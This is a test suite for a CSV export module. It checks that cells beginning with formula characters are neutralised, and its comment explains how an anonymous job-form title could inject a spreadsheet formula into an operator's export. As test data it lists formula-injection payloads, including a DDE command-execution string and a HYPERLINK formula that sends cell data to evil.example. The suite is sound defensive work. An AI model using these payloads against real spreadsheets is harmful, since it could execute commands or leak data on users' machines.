/**
 * A CELL A STRANGER WROTE MUST NOT RUN ON THE READER'S MACHINE.
 *
 * `app/lib/csv.ts` writes the board export, the site register and the options
 * export. It quoted conditionally — only when a cell held a comma, a quote or a
 * newline — and did nothing at all about the characters a spreadsheet treats as
 * the start of a FORMULA: `=`, `+`, `-`, `@`, tab and carriage return.
 *
 * That mattered because the content of those cells is not the product's. The
 * public job form reaches `POST /api/report-job`, which resolves its database
 * with `allowAnonymous: true` and pins the row to the primary organisation's
 * Jobs board; `submissionTitle` trims the title and cuts it to 200 characters
 * without inspecting a single character of it. So an anonymous visitor could
 * put `=cmd|'/c calc'!A0` on the live board and wait for an operator to press
 * Export. The payload runs in Excel, on the operator's workstation — which is
 * why nothing on the way in ever saw a reason to object.
 *
 * The repository already had the right answer in `app/lib/finance/exports.ts`,
 * whose own comment says it does not call this writer because this writer "does
 * no formula neutralisation at all". This suite holds the rule in both places
 * and holds them to the same behaviour, because they are two copies: the
 * finance analytics suite transpiles `exports.ts` on its own and rewrites only
 * its `./model` and `./rules` specifiers, so it cannot import this one.
 */

import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

const root = fileURLToPath(new URL("../", import.meta.url));
const read = async (file) => (await readFile(path.join(root, file), "utf8")).replace(/\r\n/g, "\n");
const ts = (await import("typescript")).default;

/** A module with no runtime imports, transpiled and loaded on its own. */
async function load(file) {
  const source = await read(file);
  const output = ts.transpileModule(source, {
    compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022 },
  }).outputText;
  return import(`data:text/javascript,${encodeURIComponent(output)}`);
}

const csv = await load("app/lib/csv.ts");

/* `finance/exports.ts` imports `./model`; only its neutraliser is needed here,
   so it is sliced out rather than resolved. */
const financeSource = await read("app/lib/finance/exports.ts");
const financeSlice = (() => {
  const start = financeSource.indexOf("/** Exactly a number");
  const end = financeSource.indexOf("/**", financeSource.indexOf("export function neutraliseCsvCell"));
  assert.ok(start >= 0 && end > start, "finance/exports.ts still declares the neutraliser in one block");
  return financeSource.slice(start, end);
})();
const finance = await import(
  `data:text/javascript,${encodeURIComponent(
    ts.transpileModule(financeSlice, {
      compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2022 },
    }).outputText,
  )}`
);

/** The data row of a one-cell document. */
const cell = (value) => csv.rowsToCsv(["h"], [[value]]).split("\r\n")[1];

/* ── The payloads ─────────────────────────────────────────────────────────── */

const DANGEROUS = [
  "=cmd|'/c calc'!A0",
  '=HYPERLINK("https://evil.example/?d="&A1,"click")',
  "+1+1",
  "@SUM(A1:A9)",
  "\tleading tab",
  "\rleading carriage return",
  "=1+1",
];

test("every formula starter is turned into text, in both writers", () => {
  for (const payload of DANGEROUS) {
    assert.equal(
      csv.neutraliseCsvCell(payload),
      `'${payload}`,
      `${JSON.stringify(payload)} must be neutralised`,
    );
    assert.equal(
      finance.neutraliseCsvCell(payload),
      csv.neutraliseCsvCell(payload),
      "the two copies of this rule must not drift",
    );
  }
});

test("a job title an anonymous visitor could file does not reach a cell as a formula", () => {
  /* The exact shape of the attack: the title goes onto the Jobs board through
     the public form, and comes out of the board export as the name column. */
  const written = cell("=cmd|'/c calc'!A0");
  assert.ok(written.startsWith("'") || written.startsWith('"\''), `a live payload is still live: ${written}`);
  assert.doesNotMatch(written, /^=/, "the cell must not begin with an equals sign");

  /* And it survives a round trip as text, not as a formula. */
  const parsed = csv.parseCsv(csv.rowsToCsv(["h"], [["=1+1"]]));
  assert.deepEqual(parsed[1], ["'=1+1"], "what a reader's spreadsheet receives is the literal text");
});

/* ── What must NOT change ─────────────────────────────────────────────────── */

test("a negative number is still a number a spreadsheet can add up", () => {
  /*
   * `-` is both a formula starter and a minus sign, and these exports exist to
   * be totalled. A cost quoted as text would break every column sum in them, so
   * a plain number is left exactly as it was — the same carve-out finance makes.
   */
  for (const number of ["-1", "-12.50", "1234.50", "0", "-0.01"]) {
    assert.equal(csv.neutraliseCsvCell(number), number, `${number} must stay a number`);
    assert.equal(cell(number), number);
  }
});

test("ordinary text is written exactly as it was, and quoting is unchanged", () => {
  assert.equal(cell("Aldgate"), "Aldgate", "a plain cell is still unquoted");
  assert.equal(cell(""), "", "an empty cell is still empty");
  assert.equal(cell("normal, with comma"), '"normal, with comma"', "a comma still quotes");
  assert.equal(cell('he said "hi"'), '"he said ""hi"""', "a quote is still doubled");
  assert.equal(cell("2026-09-12"), "2026-09-12", "a date is untouched");
  assert.equal(cell(null), "", "null is still an empty cell");
  assert.equal(cell(undefined), "");
});

test("the header row is neutralised too — a column can be named by a person", () => {
  /*
   * Board columns and job types are admin free text with no character
   * allow-list, and the Jobs board export now carries a "Job type" column. A
   * header is a cell like any other.
   */
  const document = csv.rowsToCsv(["=1+1"], [["x"]]);
  assert.match(document.split("\r\n")[0], /^\uFEFF'=1\+1$/, "a header that looks like a formula is text too");
});

test("toCsv neutralises on the keyed path as well as the positional one", () => {
  const document = csv.toCsv(["name"], [{ name: "@SUM(A1)" }]);
  assert.equal(document.split("\r\n")[1], "'@SUM(A1)");
});

/* ── The rule is where the readers of this file will look for it ──────────── */

test("the writer neutralises before it decides about quotes, not after", () => {
  /*
   * Order matters: neutralising after the quoting decision would leave a
   * payload containing a comma quoted but not prefixed. Pinned by source
   * because there is no input that distinguishes the two — the apostrophe adds
   * no character that would have triggered quoting.
   */
  return read("app/lib/csv.ts").then((source) => {
    assert.match(
      source,
      /const text = neutraliseCsvCell\(value === null \|\| value === undefined \? "" : String\(value\)\);/,
      "escapeCell neutralises the value it is given before testing it",
    );
    assert.match(source, /const FORMULA_STARTERS = \["=", "\+", "-", "@", "\\t", "\\r"\];/);
    assert.match(source, /const PLAIN_NUMBER = \/\^-\?\\d\+\(\\\.\\d\+\)\?\$\//);
  });
});
